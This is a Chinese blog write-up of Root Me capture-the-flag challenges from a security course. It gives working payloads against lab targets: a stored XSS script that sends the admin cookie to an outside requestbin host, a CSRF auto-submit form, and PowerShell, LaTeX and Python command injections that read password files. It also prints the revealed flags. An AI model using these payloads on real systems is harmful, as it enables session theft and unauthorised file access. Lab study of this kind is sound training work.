---
title: 【专业课】 信息安全 - 在 ROOT ME 平台上挑战信息安全项目
author: Stone SHI
date: 2021-09-28 09:23:00 +0200
categories: [Blogging, Study]
tags: [Cyber-security]
---

2021年9月28日，周二，专业课老师 Gorge 给我们在 ROOT ME 上开了一个竞赛，竞赛里提供了大量的计算机安全的题目来实践。

题目的形式多样，但是最终目标都是获取一个 code， 在题目页面上的输入框输入该 code 就可以得分。

# Web - Client

## Javascript - Authentification

提示语：Login & pass ?

进入题目的网站显示的是一个登录界面，直接查看源码即可。

```js
/* <![CDATA[ */

function Login(){
	var pseudo=document.login.pseudo.value;
	var username=pseudo.toLowerCase();
	var password=document.login.password.value;
	password=password.toLowerCase();
	if (pseudo=="4dm1n" && password=="sh.org") {
	    alert("Password accepté, vous pouvez valider le challenge avec ce mot de passe.\nYou an validate the challenge using this password.");
	} else { 
	    alert("Mauvais mot de passe / wrong password"); 
	}
}
/* ]]> */ 
```

## Javascript - Authentification 2

提示语：Oui oui, le javascript c’est très facile :)

同样也是查看网站源码即可

```js
function connexion(){
    var username = prompt("Username :", "");
    var password = prompt("Password :", "");
    var TheLists = ["GOD:HIDDEN"];
    for (i = 0; i < TheLists.length; i++)
    {
        if (TheLists[i].indexOf(username) == 0)
        {
            var TheSplit = TheLists[i].split(":");
            var TheUsername = TheSplit[0];
            var ThePassword = TheSplit[1];
            if (username == TheUsername && password == ThePassword)
            {
                alert("Vous pouvez utiliser ce mot de passe pour valider ce challenge (en majuscules) / You can use this password to validate this challenge (uppercase)");
            }
        }
        else
        {
            alert("Nope, you're a naughty hacker.")
        }
    }
}
```

点击 loggin 会出现两个弹窗，分别输入账号密码，就会告诉你 Flag 就是你输入的密码。


## XSS - Stockée 1

提示语：Du gateau !

Énoncé
Volez le cookie de session de l’administrateur et utilisez le pour valider l’épreuve.

涉及 XSS， 题目网站提供了类似于论坛留言板的界面，需要将代码注入留言板以获取管理员的 cookie 来解题。

利用 https://requestbin.net/ 生成一个 http 服务器来接受访问请求

知道服务器地址为 http://requestbin.net/r/5vds2u6y

在留言板输入以下内容

```html
<script>document.write("<img src=https://requestbin.net/r/5vds2u6y?tk="+document.cookie+" />");</script>
```

等待机器人定时访问留言板即可



https://www.cnblogs.com/li9club/p/12381847.html 生成服务器教程

## CSRF - 0 protection

提示语：Cross-Site Request Forgery

Énoncé
Activez votre compte pour accéder à l’espace privé de l’intranet.

官方参考：
http://repository.root-me.org/Exploitation%20-%20Web/FR%20-%20les%20attaques%20CSRF.pdf

http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20CSRF:%20Attack%20and%20defense.pdf

http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20Cross-site%20Request%20Forgery%20CSRF.pdf

https://requestbin.net/

解题：

点击 Register 注册一个账号，如 `attacker`，密码 `123456`。


chrome 查看 POST 请求 https://stackoverflow.com/questions/15603561/how-can-i-debug-a-http-post-in-chrome

看到这样一段代码

```html
<html>
<head>
<title>Intranet</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<a href="?action=contact">Contact</a> | <a href="?action=profile">Profile</a> | <a href="?action=private">Private</a> | <a href="?action=logout">Logout</a><hr>
<br><br><div>
		<fieldset><legend>Update Profile</legend>
		<form action="?action=profile" method="post" enctype="multipart/form-data">
		<div class="form-group">
		<label>Username:</label>
		<input type="text" name="username" value="attacker">
		</div>
		<br>		
		<div class="form-group">
		<label>Status:</label>
		<input type="checkbox" name="status" disabled >
		</div>
		<br>	
		<button type="submit">Submit</button>
		</form></fieldset>
		</div><div>You're not an admin!</div>
</body>
</html>
```

写一段，主要思路是让 admin 打开收件箱之后到 http://challenge01.root-me.org/web-client/ch22/?action=profile 这个界面，然后自动执行对攻击者账号的 validation 的 POST 界面。

```html
<form name="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
    <input type="hidden" name="username" value="attacker"> <!-- 激活账号，根据实际修改 -->
    <input type="hidden" name="status" value="on"> <!-- 激活动作 -->
</form>
<script>document.csrf.submit()</script>
```

参考：

https://www.douban.com/note/714091211/

https://exp-blog.com/safe/ctf/rootme/web-client/csrf-0-protection/



# App - Script

## Powershell - Command injection

```shell
[Press Shift-F1 for help]

Host/IP or ssh:// URL [localhost]: ssh://app-script-ch18:app-script-ch18@challen
ge05
Connecting to ssh://app-script-ch18@challenge05:22

load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
      _           _ _                        ___  ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \| ___|
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |___ \
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| |___) |
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/|____/
                                 |___/ root-me.org

ConvertFrom-SecureString : The data protection operation was unsuccessful.

This may have been caused by not having the user profile loaded for the

current thread's user context, which may be the case when the thread is

impersonating.

+                                                  ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [ConvertFrom-SecureString], Cr

   yptographicException
    + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept

   ion,Microsoft.PowerShell.Commands.ConvertFromSecureStringCommand

Table to dump:
```

```powershell
> ;ls
Connect to the database With the secure Password: . Backup the table

    Directory: C:\cygwin64\challenge\app-script\ch18

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/20/2020  10:50 AM             18 .passwd
-a----        4/21/2020  11:37 AM            314 ch18.ps1
Table to dump:
>
```

```powershell
> ;Get-content .passwd
Connect to the database With the secure Password: . Backup the table
SecureIEXpassword
Table to dump:
>
```

## Powershell - SecureString

```powershell
[Press Shift-F1 for help]

Host/IP or ssh:// URL [localhost]: ssh://app-script-ch19:app-script-ch19@challen
ge05
Connecting to ssh://app-script-ch19@challenge05:22

load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
      _           _ _                        ___  ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \| ___|
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |___ \
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| |___) |
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/|____/
                                 |___/ root-me.org

Table to dump:
>
```

```powershell
> ;ls
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table

    Directory: C:\cygwin64\challenge\app-script\ch19

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/29/2020   9:27 AM            361 .passwd.crypt
-a----       10/29/2020   9:23 AM            176 AES.key
-a----       10/29/2020   9:30 AM            331 ch19.ps1
Table to dump:
>
```

```powershell
> ;Get-Content .passwd.crypt
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table
76492d1116743f0423413b16050a5345MgB8AEkAMQBwAEwAbgBoAHgARwBXAHkAMgB3AGcAdwB3AHQA
RQBqAEEARQBPAEEAPQA9AHwAMgAyAGMANQA1ADIANwBiADEANQA4ADIANwAwAGIANAA2ADIAMQBlADAA
NwA3ADIAYgBkADYANgAyADUAYwAyAGMAYQBhAGUAMAA5ADUAMAA2ADUAYQBjADIAMQAzADIAMgA1AGYA
NgBkAGYAYgAxAGMAMgAwADUANQBkADIAMgA0AGQAYgBmADYAMQA4AGQAZgBkAGQAMwAwADUANAA4AGYA
MAAyADgAZAAwADEAMgBmAGEAZQBmADgANAAyADkA
Table to dump:
>
```


```powershell
> ;Get-content AES.key
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table
3
4
2
3
56
34
254
222
1
1
2
23
42
54
33
233
1
34
2
7
6
5
35
43
Table to dump:
```

```powershell
> ;Get-content ch19.ps1
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table

$KeyFile = "AES.key"
$key = Get-Content $KeyFile
$SecurePassword = Get-Content .passwd.crypt | ConvertTo-SecureString -key $Key

while($true){
        Write-Host "Table to dump:"
        Write-Host -NoNewLine "> "
        $table=Read-Host

        iex "Write-Host Connect to the database With the secure Password: $SecurePassword. Backup the table $table"
}
Table to dump:
>
```

```powershell
> ;$KeyFile = "AES.key"
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table
Table to dump:
> ;$Key = Get-content $KeyFile
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table
Table to dump:
> ;Get-Content .passwd.crypt | ConvertTo-SecureString -key $Key
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table
System.Security.SecureString
Table to dump:
```

```powershell
> ;$Cred = New-Object -TypeName System.Management.Automation.PSCredential `
              -ArgumentList "app-script-ch19", (Get-Content .passwd.crypt | ConvertTo-SecureString -Key $key)
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table
Table to dump:
>
```

```powershell
> ;$Cred.GetNetworkCredential().Password
Connect to the database With the secure Password: System.Security.SecureString.
Backup the table
SecureStringBypass
Table to dump:
>
```

https://www.cnblogs.com/sparkdev/archive/2017/08/01/7258507.html

https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/

https://adamtheautomator.com/powershell-get-credential/


## LaTeX - Input

提示语：Introduction à LaTeX

Énoncé
Savez-vous comment fonctionne la commande input ?

官方参考：
[Latex Global](http://repository.root-me.org/Programmation/Latex/FR%20-%20Latex%20Global.pdf)

[Latex Cheat Sheet](http://repository.root-me.org/Programmation/Latex/EN%20-%20Latex%20Cheat%20Sheet.pdf)

[Latex Guide](http://repository.root-me.org/Programmation/Latex/EN%20-%20Latex%20Guide.pdf)

解题

进入靶机后的欢迎界面没有任何有用信息。

```
[Press Shift-F1 for help]

Host/IP or ssh:// URL [localhost]: ssh://app-script-ch23:app-script-ch23@challen
ge02
Connecting to ssh://app-script-ch23@challenge02:22

load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \___ \
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |__) |
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| / __/
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/_____|
                                 |___/ root-me.org

                                     ██▒ ▒██░
                                 ░███░ █ █ ░███▒
                             ░███░        ▓     ███░
                           ▓█▓       ▓█░  ▓       ▓███
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██
                        ██  ███  ▒░       ▓░████░██    ▓█░
                       ██   ▒██      ███      ░▓██      ▒█
                      ██             ░█░      ░██        ▓█
                     ░█████████████    █     ██░          █▓
                     ██                 █ ░██             ██
                     ██      ░         ░██▓               ██
                     ██  ███    ░██▓░███                 ███
                     ▒█          ▓██▓                  ░████
                      █▓    ░████                    ░██ ▒█
                      ▓█████░                      ███ ███▓
                      ▓███                      █████░ ████
                       ▓█     ░██▓░         ▒████████░  ██
                       ▓█      ██░▒██████████████████░  ██
                       ▓█       ███▓██▒  ░██████████░   ██
                       ▓█                  ░████▒       ██
                        ░██▓           ▒█▓           ▒██░
                           ▒██░       ██ ▒█        ██▓
                              █▒                  █
                              █▒  ░█    █░   █▓   █
                              █████████████████████

 ████████████▄                             ██    ███             ███
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄

 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        █
█
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ███████████
█
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀█████████
█

--------------------------------------------------------------------------------
----------------

    Welcome on challenge02    /

-----------------------------‘

/tmp and /var/tmp are writeable

Validation password is stored in $HOME/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, ra
dare2

Attention:
    Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
    Publier des solutions publiquement (blog, github, youtube, etc.) est interdi
t.
```

查看文件可知， .passwd 为 flag ， setuid-wrapper 应该是主程序， ch23 是另一个脚本程序。

```
app-script-ch23@challenge02:~$ ll
total 668
drwxr-x---  2 app-script-ch23-cracked app-script-ch23           4096 Mar 16  2021 ./
drwxr-xr-x 23 root                    root                      4096 Aug 18 21:10 ../
-r--------  1 app-script-ch23-cracked app-script-ch23-cracked     93 Mar  3  2021 .passwd
-r-xr-x---  1 app-script-ch23-cracked app-script-ch23            893 Mar 16  2021 ch23.sh*
-rwsr-x---  1 app-script-ch23-cracked app-script-ch23         661788 Mar 16  2021 setuid-wrapper*
-r--r-----  1 app-script-ch23-cracked app-script-ch23            262 Mar 16  2021 setuid-wrapper.c
```

查看 setuid-wrapper.c 这个文件

```c
#include <unistd.h>

/* setuid script wrapper */

int main(int arc, char** arv) {
    char *argv[] = { "/bin/bash", "-p", "/challenge/app-script/ch23/ch23.sh", ar
v[1] , NULL };
    setreuid(geteuid(), geteuid());
    execve(argv[0], argv, NULL);
    return 0;
}
```

再查看 ch23.sh

```sh
#!/usr/bin/env bash

if [[ $# -ne 1 ]]; then
    echo "Usage : ${0} TEX_FILE"
fi

if [[ -f "${1}" ]]; then
    TMP=$(mktemp -d)
    cp "${1}" "${TMP}/main.tex"

    # Compilation
    echo "[+] Compilation ..."
    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        -no-shell-escape \
        "${TMP}/main.tex" > /dev/null

    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        -no-shell-escape \
        "${TMP}/main.tex" > /dev/null

    chmod u+w "${TMP}/main.tex"
    rm "${TMP}/main.tex"
    chmod 750 -R "${TMP}"
    if [[ -f "${TMP}/main.pdf" ]]; then
        echo "[+] Output file : ${TMP}/main.pdf"
    else
        echo "[!] Compilation error, your logs : ${TMP}/main.log"
    fi
else
    echo "[!] Can't access file ${1}"
fi
```

通过参考一些网络上的文章，明白了主要思路就是写一个 LaTex 的源文件，然后在源文件里使用 input 函数来显示 .passwd 的内容。

首先需要一个 LaTex 源文件。 

使用 vim 直接新建一个 LaTex 的源文件并不可行，因为文件不可写入。

于是根据 `ch23.sh` 文件内的代码发现一个可以用的指令 `mktemp`，经过查阅发现这个指令用于创建一个临时文件。

```sh
app-script-ch23@challenge02:~$ mktemp
/tmp/tmp.mprfMcooq7
```

创建了一个路径为 `/tmp/tmp.mprfMcooq7` 的临时文件。

通过代码 `vim /tmp/tmp.mprfMcooq7` 使用 vim 对这个文件进行编辑，并且复制进以下 LaTex 源码。

```latex
\documentclass{article}
\begin{document}
\input{/challenge/app-script/ch23/.passwd}
\end{document}
```

`Esc` + `:wq` 成功保存。

编译

```sh
app-script-ch23@challenge02:~$ ./setuid-wrapper /tmp/tmp.mprfMcooq7
[+] Compilation ...
[+] Output file : /tmp/tmp.jrJqLGOTOg/main.pdf
```

现在得到了 main.pdf 这个文件，里面应该有 input 进来的 .passwd 文件里的内容。

打开自己的终端，把这个 pdf 下载过来

```sh
C:\Users\Stone>scp -P 2222 app-script-ch23@challenge02.root-me.org:/tmp/tmp.jrJqLGOTOg/main.pdf .
Warning: Permanently added the ECDSA host key for IP address '[2001:bc8:35b0:c166::152]:2222' to the list of known hosts.
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \___ \
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |__) |
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| / __/
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/_____|
                                 |___/ root-me.org

app-script-ch23@challenge02.root-me.org's password:
main.pdf                                                                              100%   14KB 180.9KB/s   00:00
```

发现 Flag 被注释掉了

再次打开源文件，增加一行 

`\usepackage{verbatim}`

以及将 

改为 `\verbatim{/challenge/app-script/ch23/.passwd}`

```latex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/challenge/app-script/ch23/.passwd}
\end{document}
```

重复之前的步骤，编译下载

```sh
app-script-ch23@challenge02:~$ ./setuid-wrapper /tmp/tmp.mprfMcooq7
[+] Compilation ...
[+] Output file : /tmp/tmp.g2WiS14pgf/main.pdf
```

妈蛋 LaTeX_1nput_1s_n0t_v3ry_s3kur3



参考

https://0day.work/hacking-with-latex/

https://exexute.github.io/2019/04/24/how-hacking-with-LaTex/

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection 关键代码在此

## Python - input()

```sh
[Press Shift-F1 for help]

Host/IP or ssh:// URL [localhost]: ssh://app-script-ch6:app-script-ch6@challenge
02
Connecting to ssh://app-script-ch6@challenge02:22

load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \___ \
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |__) |
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| / __/
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/_____|
                                 |___/ root-me.org

                                     ██▒ ▒██░
                                 ░███░ █ █ ░███▒
                             ░███░        ▓     ███░
                           ▓█▓       ▓█░  ▓       ▓███
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██
                        ██  ███  ▒░       ▓░████░██    ▓█░
                       ██   ▒██      ███      ░▓██      ▒█
                      ██             ░█░      ░██        ▓█
                     ░█████████████    █     ██░          █▓
                     ██                 █ ░██             ██
                     ██      ░         ░██▓               ██
                     ██  ███    ░██▓░███                 ███
                     ▒█          ▓██▓                  ░████
                      █▓    ░████                    ░██ ▒█
                      ▓█████░                      ███ ███▓
                      ▓███                      █████░ ████
                       ▓█     ░██▓░         ▒████████░  ██
                       ▓█      ██░▒██████████████████░  ██
                       ▓█       ███▓██▒  ░██████████░   ██
                       ▓█                  ░████▒       ██
                        ░██▓           ▒█▓           ▒██░
                           ▒██░       ██ ▒█        ██▓
                              █▒                  █
                              █▒  ░█    █░   █▓   █
                              █████████████████████

 ████████████▄                             ██    ███             ███
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄

 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        █
█
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ███████████
█
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀█████████
█

--------------------------------------------------------------------------------
----------------

    Welcome on challenge02    /

-----------------------------‘

/tmp and /var/tmp are writeable

Validation password is stored in $HOME/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, ra
dare2

Attention:
    Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
    Publier des solutions publiquement (blog, github, youtube, etc.) est interdi
t.

--------------------------------------------------------------------------------
----------------

    Challenge informations   /

----------------------------‘

Use the ./setuid-wrapper to get the right privileges.

app-script-ch6@challenge02:~$
```

```sh
app-script-ch6@challenge02:~$ ll
total 32
dr-xr-x---  2 app-script-ch6-cracked app-script-ch6         4096 May 19  2019 ./
drwxr-xr-x 23 root                   root                   4096 Aug 18 21:10 ../
-rw-r-----  1 app-script-ch6         app-script-ch6           54 Aug  8  2017 .motd
-r--------  1 app-script-ch6-cracked app-script-ch6-cracked   33 May 20  2014 .passwd
-r-xr-x---  1 app-script-ch6         app-script-ch6          365 Jun 12  2014 ch6.py*
-rwsr-x---  1 app-script-ch6-cracked app-script-ch6         7260 May 19  2019 setuid-wrapper*
-r--r-----  1 app-script-ch6-cracked app-script-ch6          207 May 19  2019 setuid-wrapper.c
```

查看 ch6.py 文件

```python
#!/usr/bin/python2

import sys

def youLose():
    print "Try again ;-)"
    sys.exit(1)

try:
    p = input("Please enter password : ")
except:
    youLose()

with open(".passwd") as f:
    passwd = f.readline().strip()
    try:
        if (p == int(passwd)):
            print "Well done ! You can validate with this password !"
    except:
        youLose()
```

再查看 setuid-wrapper.c

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

/* setuid script wrapper */

int main()
{
    setreuid(geteuid(), geteuid());
    system("/challenge/app-script/ch6/ch6.py");
    return 0;
}
```

```sh
app-script-ch6@challenge02:~$ ./setuid-wrapper
Please enter password : __import__('os').system('cat .passwd')
13373439872909134298363103573901
```

https://blog.51cto.com/u_12332766/2299894

https://www.cnblogs.com/heycomputer/articles/10537633.html

## Bash - Shells restreints

提示语 RTFM

Énoncé
Récupérez le mot de passe de validation dans le fichier .passwd.

Votre objectif est d’escalader les utilisateurs un par un à l’aide des commandes disponibles, pour arriver jusqu’à app-script-ch14-14 qui aura les droits de lecture sur le fichier .passwd.

官方索引：
[Escaping Restricted Linux Shells - Escaping Restricted Linux Shells](http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Escaping%20Restricted%20Linux%20Shells%20-%20Escaping%20Restricted%20Linux%20Shells.pdf)

[Shells restreints comment les détourner - Dawid Gołuński](http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/FR%20-%20Shells%20restreints%20comment%20les%20d%C3%A9tourner%20-%20Dawid%20Go%C5%82u%C5%84ski.pdf)

```sh
[Press Shift-F1 for help]

Host/IP or ssh:// URL [localhost]: ssh://app-script-ch14:app-script-ch14@challen
ge02
Connecting to ssh://app-script-ch14@challenge02:22

load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \___ \
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |__) |
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| / __/
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/_____|
                                 |___/ root-me.org

                                     ██▒ ▒██░
                                 ░███░ █ █ ░███▒
                             ░███░        ▓     ███░
                           ▓█▓       ▓█░  ▓       ▓███
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██
                        ██  ███  ▒░       ▓░████░██    ▓█░
                       ██   ▒██      ███      ░▓██      ▒█
                      ██             ░█░      ░██        ▓█
                     ░█████████████    █     ██░          █▓
                     ██                 █ ░██             ██
                     ██      ░         ░██▓               ██
                     ██  ███    ░██▓░███                 ███
                     ▒█          ▓██▓                  ░████
                      █▓    ░████                    ░██ ▒█
                      ▓█████░                      ███ ███▓
                      ▓███                      █████░ ████
                       ▓█     ░██▓░         ▒████████░  ██
                       ▓█      ██░▒██████████████████░  ██
                       ▓█       ███▓██▒  ░██████████░   ██
                       ▓█                  ░████▒       ██
                        ░██▓           ▒█▓           ▒██░
                           ▒██░       ██ ▒█        ██▓
                              █▒                  █
                              █▒  ░█    █░   █▓   █
                              █████████████████████

 ████████████▄                             ██    ███             ███
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄

 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        █
█
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ███████████
█
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀█████████
█

--------------------------------------------------------------------------------
----------------

    Welcome on challenge02    /

-----------------------------‘

/tmp and /var/tmp are writeable

Validation password is stored in $HOME/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, ra
dare2

Attention:
    Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
    Publier des solutions publiquement (blog, github, youtube, etc.) est interdi
t.

           ======================
           || Restricted shell ||
      ================================
       ||     ||<(.)>||<(.)>||     ||
       ||    _||     ||     ||_    ||
       ||   (__D     ||     C__)   ||
       ||   (__D     ||     C__)   ||
       ||   (__D     ||     C__)   ||
       ||   (__D     ||     C__)   ||
       ||     ||     ||     ||     ||
      ================================
 * Don't forget to check 'sudo -l' for all steps.
 * No output network access authorized.
 * Keep your commands on hand ;)

app-script-ch14@challenge02:~$
```


参考：
https://habr.com/ru/post/321760/

# Web - Serveur

## HTML - Code source

chrome 直接 F12 查看源代码

```html
<!--
                                                                                                                                                                                                                                                        Je crois que c'est vraiment trop simple là !
                                                                                                                                                                                                                                                            It's really too easy !
                                                                                                                                                                                                                                                                 password : nZ^&@q5&sjJHev0

-->
```

## HTTP - User-agent

查看源码

使用 chrome 自带工具修改 user-agent 

https://exp-blog.com/safe/ctf/rootme/web-server/http-user-agent/

user-agent 修改教程 https://dysaniazzz.github.io/2019/06/06/useragent/

## HTTP - POST

提示语：Connaissez-vous le protocole HTTP ?

官方参考：
https://en.wikipedia.org/wiki/POST_(HTTP)

查看源码，修改，提交


https://exp-blog.com/safe/ctf/rootme/web-server/http-post/

右键 -> Edit as HTML

# App - Système

http://showlinkroom.me/2017/11/20/Root-me-App-System01/

## ELF x86 - Stack buffer overflow basic 1

```shell
[Press Shift-F1 for help]

Host/IP or ssh:// URL [localhost]: ssh://app-systeme-ch13:app-systeme-ch13@chall
enge02
Connecting to ssh://app-systeme-ch13@challenge02:22

load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
